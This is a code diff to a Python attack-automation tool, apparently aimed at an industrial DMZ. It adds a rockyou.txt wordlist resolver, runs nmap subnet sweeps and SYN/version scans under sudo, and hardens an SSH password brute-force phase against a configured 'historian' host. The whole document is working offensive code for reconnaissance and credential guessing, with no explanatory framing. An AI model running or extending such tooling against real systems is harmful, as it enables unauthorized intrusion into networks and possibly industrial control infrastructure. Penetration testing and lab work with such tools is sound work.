@@ -238,7 +238,33 @@ def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[st
 
 
 def confirm_phase(title: str) -> bool:
-    return Confirm.ask(f"\n[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)
+    console.print()  # blank line so prompt never lands mid-output
+    return Confirm.ask(f"[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)
+
+
+def _resolve_wordlist(path: str) -> str | None:
+    """
+    Find rockyou.txt — handle gzipped version on stock Kali,
+    and fall back to common alternate locations.
+    """
+    candidates = [
+        path,
+        path + ".gz",
+        "/usr/share/wordlists/rockyou.txt",
+        "/usr/share/wordlists/rockyou.txt.gz",
+        "/opt/wordlists/rockyou.txt",
+        os.path.expanduser("~/rockyou.txt"),
+    ]
+    for p in candidates:
+        if os.path.exists(p):
+            if p.endswith(".gz"):
+                extracted = p[:-3]
+                if not os.path.exists(extracted):
+                    info(f"Extracting {p} ...")
+                    run_cmd(f"sudo gunzip -k {p}", capture=False)
+                return extracted if os.path.exists(extracted) else None
+            return p
+    return None
 
 
 def _find_gateway() -> str | None:
@@ -266,7 +292,7 @@ def _probe_gateway_for_subnets(gateway: str) -> list[str]:
     # Sweep private ranges quickly — hosts that reply must be routable via gw
     sweep_targets = "10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
     rc, out = run_cmd(
-        f"nmap -T4 -n --open -sn --send-eth "
+        f"sudo nmap -T4 -n --open -sn --send-eth "
         f"--script='' {sweep_targets} 2>/dev/null | grep 'Nmap scan report'",
         timeout=20, capture=False
     )
@@ -383,8 +409,9 @@ def phase2_idmz_recon() -> PhaseResult:
     # -sV          version detection
     # --version-intensity 0   grab banner only, no deep probing
     # --min-rate 1000          send at least 1000 packets/sec on LAN
+    # -sS requires root — prefix with sudo; falls back gracefully if already root
     nmap_cmd = (
-        f"nmap -T4 -n -sS --open -sV --version-intensity 0 "
+        f"sudo nmap -T4 -n -sS --open -sV --version-intensity 0 "
         f"--min-rate 1000 -p {ports} {subnet}"
     )
     info("Fast SYN scan — should complete in ~5–10s on LAN")
@@ -429,9 +456,8 @@ def _ssh_bruteforce(
     try:
         with open(wordlist_path, errors="ignore") as f:
             wordlist = [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        err(f"Wordlist not found: {wordlist_path}")
-        return None
+    except (FileNotFoundError, OSError):
+        wordlist = []  # priority list will still run
 
     candidates = priority + wordlist
     total      = len(candidates)
@@ -506,9 +532,16 @@ def phase3_ssh_bruteforce() -> PhaseResult:
     ip   = CFG["historian"]["ip"]
     port = CFG["historian"]["port"]
     user = CFG["historian"]["username"]
-    wl   = CFG["hydra"]["wordlist"]
+    wl   = _resolve_wordlist(CFG["hydra"]["wordlist"])
 
     info(f"Target: {user}@{ip}:{port}")
+
+    if wl:
+        info(f"Wordlist: {wl}")
+    else:
+        warn("rockyou.txt not found — running priority-list only (empty/username/common)")
+        wl = "/dev/null"  # _ssh_bruteforce handles missing file gracefully
+
     info("Order: empty → username → reversed → common → wordlist (top to bottom, no repeats)")
 
     found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)
